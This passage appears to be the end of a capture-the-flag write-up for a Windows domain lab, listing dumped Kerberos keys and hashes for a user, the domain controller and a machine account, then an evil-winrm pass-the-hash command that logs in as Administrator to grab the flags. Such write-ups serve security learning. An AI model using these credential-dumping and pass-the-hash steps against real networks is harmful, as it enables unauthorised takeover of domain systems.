john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:0dd107e83b56d8bce01d563ff5eb022359ddd1552d0d72ae33082513ef8352f2
darkzero-ext$:aes128-cts-hmac-sha1-96:1108895c6d925042d9bed0e258f19ca2
darkzero-ext$:0x17:5a9caebc3a454826fdb856385be9d23f
[*] Cleaning up...
```
![[Pasted image 20251207224315.png]]

- Using the `Administrator` hash I logged into DC01 and grabbed the uesr and root flag:
```
evil-winrm -u Administrator -H '5917507bdf2ef2c2b0a869a1cba40726' -i 10.10.11.89
```
![[Pasted image 20251207224407.png]]
![[Pasted image 20251207224441.png]]